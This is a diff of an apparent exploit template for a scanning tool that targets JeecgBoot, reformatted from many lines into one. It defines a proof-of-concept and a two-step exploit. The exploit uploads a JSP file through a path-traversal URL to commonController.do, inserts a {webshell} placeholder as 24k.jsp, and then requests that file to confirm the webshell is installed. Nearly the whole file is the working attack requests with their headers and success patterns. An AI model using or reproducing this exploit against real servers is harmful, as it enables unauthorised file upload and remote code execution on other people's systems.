@@ -1,52 +1,1 @@
-{
-  "name":"jeecgboot文件上传",
-  "tag":"jeecg-boot",
-  "type":"upload",
-  "poc": {
-    "pocGet": "/api/../commonController.do?parserXml",
-    "pocPost": "-----------------------------37624949489622594842194829405\r\nContent-Disposition: form-data; name=\"file\"; filename=\"666.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n111\r\n-----------------------------37624949489622594842194829405--",
-    "header": {
-      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-      "Upgrade-Insecure-Requests": "1",
-      "Sec-Fetch-Site": "cross-site",
-      "Sec-Fetch-Mode": "navigate",
-      "Sec-Fetch-Dest": "document",
-      "content-type": "multipart/form-data; boundary=---------------------------37624949489622594842194829405",
-      "User-Agent": "Mozilla/5.0 (Linux;",
-      "Accept-Encoding": "gzip, deflate",
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-      "Te": "trailers"
-    },
-    "Pattern": "(\"success\":true)"
-  },
-  "exp": {
-    "step1": {
-      "expGet": "/api/../commonController.do?parserXml",
-      "expPost": "-----------------------------37624949489622594842194829405\r\nContent-Disposition: form-data; name=\"file\"; filename=\"24k.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n{webshell}\r\n-----------------------------37624949489622594842194829405--",
-      "header": {
-        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Site": "cross-site",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Dest": "document",
-        "content-type": "multipart/form-data; boundary=---------------------------37624949489622594842194829405",
-        "User-Agent": "Mozilla/5.0 (Linux;",
-        "Accept-Encoding": "gzip, deflate",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-        "Te": "trailers"
-      },
-      "Pattern": "(\"success\":true)"
-    },
-    "step2": {
-      "expGet": "/24k.jsp",
-      "header": {
-        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
-        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
-        "User-Agent": "Mozilla/5.0 (Linux;"
-      },
-      "Pattern": "()"
-    }
-  }
-}
+{  "name":"jeecgboot文件上传",  "tag":"jeecg-boot",  "type":"upload",  "poc": {    "pocGet": "/api/../commonController.do?parserXml",    "pocPost": "-----------------------------37624949489622594842194829405\r\r\nContent-Disposition: form-data; name=\"file\"; filename=\"666.jsp\"\r\r\nContent-Type: application/octet-stream\r\r\n\r\r\n111\r\r\n-----------------------------37624949489622594842194829405--",    "header": {      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",      "Upgrade-Insecure-Requests": "1",      "Sec-Fetch-Site": "cross-site",      "Sec-Fetch-Mode": "navigate",      "Sec-Fetch-Dest": "document",      "content-type": "multipart/form-data; boundary=---------------------------37624949489622594842194829405",      "User-Agent": "Mozilla/5.0 (Linux;",      "Accept-Encoding": "gzip, deflate",      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",      "Te": "trailers"    },    "Pattern": "(\"success\":true)"  },  "exp": {    "step1": {      "expGet": "/api/../commonController.do?parserXml",      "expPost": "-----------------------------37624949489622594842194829405\r\r\nContent-Disposition: form-data; name=\"file\"; filename=\"24k.jsp\"\r\r\nContent-Type: application/octet-stream\r\r\n\r\r\n{webshell}\r\r\n-----------------------------37624949489622594842194829405--",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "Upgrade-Insecure-Requests": "1",        "Sec-Fetch-Site": "cross-site",        "Sec-Fetch-Mode": "navigate",        "Sec-Fetch-Dest": "document",        "content-type": "multipart/form-data; boundary=---------------------------37624949489622594842194829405",        "User-Agent": "Mozilla/5.0 (Linux;",        "Accept-Encoding": "gzip, deflate",        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",        "Te": "trailers"      },      "Pattern": "(\"success\":true)"    },    "step2": {      "expGet": "/24k.jsp",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",        "User-Agent": "Mozilla/5.0 (Linux;"      },      "Pattern": "()"    }  }}
